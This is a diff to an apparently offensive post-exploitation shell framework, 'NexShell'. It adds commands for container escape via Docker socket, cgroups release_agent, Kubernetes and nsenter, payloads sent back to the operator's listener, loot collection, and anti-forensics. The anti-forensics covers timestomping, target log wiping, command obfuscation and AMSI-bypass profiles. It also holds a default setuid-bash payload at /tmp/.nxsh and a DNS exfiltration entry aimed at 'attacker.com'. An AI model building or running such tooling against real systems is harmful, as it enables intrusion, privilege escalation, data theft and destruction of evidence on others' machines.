@@ -1507,24 +1507,43 @@ class MainMenu(BetterCMD):
         win = is_windows_session(session) if session else False
 
         MODULE_MAP = {
-            # Linux
-            'quickenum':     ('_quickenum', False),
-            'privesc':       ('_privesc', False),
-            'credharvest':   ('_credharvest', False),
-            'creds':         ('_credharvest', False),
-            # Windows
-            'win-enum':      ('_win_enum', True),
-            'win-privesc':   ('_win_privesc', True),
-            'win-creds':     ('_win_creds', True),
-            # AD
-            'ad-recon':      ('_ad_recon', True),
-            'ad-kerberoast': ('_ad_kerberoast', True),
-            'ad-asreproast': ('_ad_asreproast', True),
-            # Cross-platform
-            'persist':       ('_persist', None),
-            'lateral':       ('_lateral', None),
-            'container':     ('_container', False),
-            'exfil':         ('_exfil', None),
+            # ── Linux Recon
+            'quickenum':        ('_quickenum',        False),
+            'privesc':          ('_privesc',           False),
+            'credharvest':      ('_credharvest',       False),
+            'creds':            ('_credharvest',       False),
+            # ── Windows Recon
+            'win-enum':         ('_win_enum',          True),
+            'win-privesc':      ('_win_privesc',       True),
+            'win-creds':        ('_win_creds',         True),
+            # ── Active Directory
+            'ad-recon':         ('_ad_recon',          True),
+            'ad-kerberoast':    ('_ad_kerberoast',     True),
+            'ad-asreproast':    ('_ad_asreproast',     True),
+            # ── Persistence
+            'persist':          ('_persist',           None),
+            'persist-linux':    ('_persist',           False),
+            'persist-win':      ('_persist',           True),
+            # ── Lateral Movement
+            'lateral':          ('_lateral',           None),
+            # ── Container Escape
+            'container':        ('_container',         False),
+            'container-auto':   ('_container_auto',    False),
+            'container-docker': ('_container_docker',  False),
+            'container-cgroup': ('_container_cgroup',  False),
+            'container-k8s':    ('_container_k8s',     False),
+            'container-ns':     ('_container_ns',      False),
+            # ── Exfiltration
+            'exfil':            ('_exfil',             None),
+            # ── Loot
+            'loot':             ('_loot',              None),
+            'loot-scan':        ('_loot_scan',         None),
+            'loot-report':      ('_loot_report',       None),
+            # ── OPSEC
+            'opsec':            ('_opsec',             None),
+            'timestomp':        ('_timestomp',         None),
+            'logclean':         ('_logclean',          None),
+            'obfuscate':        ('_obfuscate',         None),
         }
 
         if mod in MODULE_MAP:
@@ -1546,30 +1565,22 @@ class MainMenu(BetterCMD):
             MODULE_REGISTRY = {}
 
         categories = {
-            'recon':   ('🔍 Recon',          paint('recon').teal),
-            'privesc': ('⬆️  Privilege Esc',   paint('privesc').red),
-            'creds':   ('🔑 Credentials',     paint('creds').yellow),
-            'ad':      ('🏛  Active Directory', paint('ad').orange),
-            'persist': ('🔒 Persistence',      paint('persist').magenta),
-            'lateral': ('➡️  Lateral Movement', paint('lateral').purple),
-            'escape':  ('🐳 Container Escape', paint('escape').lime),
-            'exfil':   ('📤 Exfiltration',     paint('exfil').cyan),
+            'recon':   ('Recon',           paint('recon').teal),
+            'privesc': ('Privilege Esc',    paint('privesc').red),
+            'creds':   ('Credentials',      paint('creds').yellow),
+            'ad':      ('Active Directory', paint('ad').orange),
+            'persist': ('Persistence',      paint('persist').magenta),
+            'lateral': ('Lateral Movement', paint('lateral').purple),
+            'escape':  ('Container Escape', paint('escape').lime),
+            'exfil':   ('Exfiltration',     paint('exfil').cyan),
+            'loot':    ('Loot Collection',  paint('loot').teal),
+            'opsec':   ('OPSEC',            paint('opsec').darkgrey),
         }
 
-        fallback = {
-            'quickenum':   {'desc':'Fast Linux enumeration','os':'linux','type':'recon'},
-            'privesc':     {'desc':'Linux PrivEsc advisor','os':'linux','type':'privesc'},
-            'credharvest': {'desc':'Linux credential harvester','os':'linux','type':'creds'},
-            'win-enum':    {'desc':'Windows system enumeration','os':'windows','type':'recon'},
-            'win-privesc': {'desc':'Windows PrivEsc advisor','os':'windows','type':'privesc'},
-            'win-creds':   {'desc':'Windows credential harvester','os':'windows','type':'creds'},
-            'ad-recon':    {'desc':'AD enumeration (no tools)','os':'windows','type':'ad'},
-            'persist':     {'desc':'Persistence mechanisms','os':'both','type':'persist'},
-            'lateral':     {'desc':'Lateral movement commands','os':'both','type':'lateral'},
-            'container':   {'desc':'Container/Docker escape','os':'linux','type':'escape'},
-            'exfil':       {'desc':'Data exfiltration','os':'both','type':'exfil'},
-        }
-        mods = MODULE_REGISTRY or fallback
+        try:
+            from modules.ops import MODULE_REGISTRY as mods
+        except ImportError:
+            mods = {}
 
         print(f'\n  {paint("NexShell Module Arsenal").purple_BRIGHT}\n')
         grouped = {}
@@ -1580,7 +1591,7 @@ class MainMenu(BetterCMD):
         for cat_key, (cat_label, cat_color) in categories.items():
             if cat_key not in grouped: continue
             print(f'  {cat_color} {paint(cat_label).BRIGHT}')
-            tbl = Table(joinchar=' │ ')
+            tbl = Table(joinchar=' | ')
             for name, info in grouped[cat_key]:
                 os_tag = paint(f"[{info.get('os','?')}]").darkgrey
                 tbl += [paint(name).lime, paint(info.get('desc','')).white, os_tag]
@@ -1748,7 +1759,7 @@ class MainMenu(BetterCMD):
         print(indent(str(tbl), '  '))
         print()
 
-    # ── Container Escape Module ────────────────────────────────────────────────
+    # ── Container Escape Modules ───────────────────────────────────────────────
     def _container(self, args=''):
         try:
             from modules.ops import ContainerEscape
@@ -1756,10 +1767,193 @@ class MainMenu(BetterCMD):
             cmdlogger.error("ops module not found"); return
         session = core.sessions.get(self.sid)
         if session:
-            logger.info("Running container environment check (in-memory)...")
-            session.exec_inmem(ContainerEscape.check_environment())
+            logger.info("Container escape detector running (in-memory, no disk)...")
+            session.exec_inmem(ContainerEscape.full_detect())
         else:
-            print(paint(ContainerEscape.check_environment()).darkgrey)
+            print(paint(ContainerEscape.full_detect()).darkgrey)
+
+    def _container_auto(self, args=''):
+        try:
+            from modules.ops import ContainerEscape
+        except ImportError:
+            cmdlogger.error("ops module not found"); return
+        session = core.sessions.get(self.sid)
+        listeners = list(core.listeners.values())
+        lhost = Interfaces().ips[0] if Interfaces().ips else ''
+        lport = listeners[0].port if listeners else 0
+        logger.info("Auto-escape: trying all vectors...")
+        session.exec_inmem(ContainerEscape.auto_escape(lhost, lport))
+
+    def _container_docker(self, args=''):
+        try:
+            from modules.ops import ContainerEscape
+        except ImportError:
+            cmdlogger.error("ops module not found"); return
+        listeners = list(core.listeners.values())
+        lhost = Interfaces().ips[0] if Interfaces().ips else ''
+        lport = listeners[0].port if listeners else 0
+        script = ContainerEscape.escape_docker_socket(lhost, lport)
+        logger.info("Docker socket escape payload:")
+        print(f'\n  {paint(script).yellow}\n')
+        if core.sessions.get(self.sid):
+            if ask("Send to session? (y/N): ").lower() == 'y':
+                core.sessions[self.sid].exec_inmem(script)
+
+    def _container_cgroup(self, args=''):
+        try:
+            from modules.ops import ContainerEscape
+        except ImportError:
+            cmdlogger.error("ops module not found"); return
+        session = core.sessions.get(self.sid)
+        cmd = args or 'cp /bin/bash /tmp/.nxsh && chmod 4755 /tmp/.nxsh'
+        logger.info(f"cgroups v1 release_agent escape. Payload cmd: {cmd}")
+        session.exec_inmem(ContainerEscape.escape_cgroups_v1(cmd))
+
+    def _container_k8s(self, args=''):
+        try:
+            from modules.ops import ContainerEscape
+        except ImportError:
+            cmdlogger.error("ops module not found"); return
+        session = core.sessions.get(self.sid)
+        logger.info("Kubernetes service account escape...")
+        session.exec_inmem(ContainerEscape.escape_kubernetes())
+
+    def _container_ns(self, args=''):
+        try:
+            from modules.ops import ContainerEscape
+        except ImportError:
+            cmdlogger.error("ops module not found"); return
+        session = core.sessions.get(self.sid)
+        logger.info("Namespace escape via nsenter...")
+        session.exec_inmem(ContainerEscape.escape_runc_namespace())
+
+    # ── Loot Modules ──────────────────────────────────────────────────────────
+    def _loot(self, args=''):
+        try:
+            from modules.loot import LootCollector, LINUX_COLLECTION_CMDS, WINDOWS_COLLECTION_CMDS
+        except ImportError:
+            cmdlogger.error("loot module not found"); return
+        session = core.sessions.get(self.sid)
+        if not session: return
+        win = is_windows_session(session)
+        logger.info("Starting loot collection...")
+        cmds = WINDOWS_COLLECTION_CMDS if win else LINUX_COLLECTION_CMDS
+        for cmd in cmds[:5]:   # first 5 non-intrusive
+            session.exec(cmd)
+
+    def _loot_scan(self, args=''):
+        try:
+            from modules.loot import LootScanner
+        except ImportError:
+            cmdlogger.error("loot module not found"); return
+        session = core.sessions.get(self.sid)
+        if not session: return
+        logger.info("Scanning session output for sensitive data...")
+        # Grab last N bytes of session log
+        logfile = session.directory / 'session.log'
+        if logfile.exists():
+            text = logfile.read_text(errors='replace')
+            scanner = LootScanner()
+            findings = scanner.scan(text)
+            if findings:
+                print(f'\n  {paint("Loot Findings").purple_BRIGHT}\n')
+                for cat, items in findings.items():
+                    if items:
+                        print(f'  {paint(cat).orange}')
+                        for item in items[:10]:
+                            print(f'    {paint(">").teal} {item}')
+            else:
+                cmdlogger.warning("No sensitive data found in session log")
+        else:
+            cmdlogger.warning("No session log yet — run some commands first")
+
+    def _loot_report(self, args=''):
+        try:
+            from modules.loot import LootCollector
+        except ImportError:
+            cmdlogger.error("loot module not found"); return
+        session = core.sessions.get(self.sid)
+        if not session: return
+        fmt = args.strip() or 'md'
+        collector = LootCollector(str(session.directory))
+        logfile = session.directory / 'session.log'
+        if logfile.exists():
+            collector.scan_text(logfile.read_text(errors='replace'))
+        out = collector.export(fmt)
+        rpt = session.directory / f'loot_report.{fmt}'
+        rpt.write_text(out, encoding='utf-8')
+        logger.info(f"Loot report saved: {paint(str(rpt)).lime}")
+
+    # ── OPSEC Modules ─────────────────────────────────────────────────────────
+    def _opsec(self, args=''):
+        try:
+            from modules.opsec import OpsecProfile
+        except ImportError:
+            cmdlogger.error("opsec module not found"); return
+        if args:
+            profile = args.strip().lower()
+            valid = ('ghost', 'normal', 'paranoid')
+            if profile not in valid:
+                cmdlogger.warning(f"Valid profiles: {', '.join(valid)}"); return
+            options.opsec_profile = profile
+            OpsecProfile.set(profile)
+            logger.info(f"OPSEC profile set: {paint(profile.upper()).lime}")
+        else:
+            current = getattr(options, 'opsec_profile', 'normal')
+            print(f'\n  {paint("OPSEC Profiles").purple_BRIGHT}\n')
+            for name, desc in [
+                ('ghost',    'Max stealth — jitter 200-500ms, no disk writes, AMSI bypass auto'),
+                ('normal',   'Balanced — 50ms jitter, minimal logging'),
+                ('paranoid', 'Ultra-paranoid — TLS only, C2 heartbeat, DoH comms, cleanup on exit'),
+            ]:
+                marker = paint('>>').lime if name == current else '  '
+                print(f'  {marker} {paint(name).cyan:20} {paint(desc).darkgrey}')
+            print()
+
+    def _timestomp(self, args=''):
+        try:
+            from modules.opsec import timestomp_linux, timestomp_windows
+        except ImportError:
+            cmdlogger.error("opsec module not found"); return
+        session = core.sessions.get(self.sid)
+        if not session: return
+        win = is_windows_session(session)
+        target = args.strip() or ('/tmp/.nxsh' if not win else '%TEMP%\\payload.exe')
+        ref    = args.split()[1] if len(args.split()) > 1 else ''
+        script = timestomp_windows(target, ref) if win else timestomp_linux(target, ref)
+        logger.info(f"Timestomping: {paint(target).yellow}")
+        if win:
+            self._exec_powershell_inmem(script)
+        else:
+            session.exec_inmem(script)
+
+    def _logclean(self, args=''):
+        try:
+            from modules.opsec import clean_linux_logs, clean_windows_logs
+        except ImportError:
+            cmdlogger.error("opsec module not found"); return
+        session = core.sessions.get(self.sid)
+        if not session: return
+        win = is_windows_session(session)
+        logger.info("Cleaning logs on target...")
+        if win:
+            self._exec_powershell_inmem(clean_windows_logs())
+        else:
+            session.exec_inmem(clean_linux_logs())
+
+    def _obfuscate(self, args=''):
+        try:
+            from modules.opsec import ObfuscationEngine
+        except ImportError:
+            cmdlogger.error("opsec module not found"); return
+        if not args:
+            cmdlogger.warning("Usage: run obfuscate <command>"); return
+        parts = args.split(' ', 1)
+        method = parts[0] if len(parts) > 1 and parts[0] in ('xor','b64','hex','chararray','iex') else 'b64'
+        cmd    = parts[1] if len(parts) > 1 else parts[0]
+        result = ObfuscationEngine.obfuscate(cmd, method)
+        print(f'\n  {paint("Obfuscated").purple_BRIGHT} [{paint(method).cyan}]\n')
+        print(f'  {paint(result).yellow}\n')
 
     # ── Data Exfil Module ─────────────────────────────────────────────────────
     def _exfil(self, args=''):
@@ -1786,7 +1980,7 @@ class MainMenu(BetterCMD):
                 ('DNS',        DataExfil.dns_exfil('<data>', 'attacker.com')),
                 ('HTTP POST',  DataExfil.linux_http_exfil('<file>', host, 8000)),
             ]
-        tbl = Table(joinchar=' │ ')
+        tbl = Table(joinchar=' | ')
         for name, cmd_str in entries:
             tbl += [paint(name).lime, paint(cmd_str[:100]).white]
         print(indent(str(tbl), '  '))
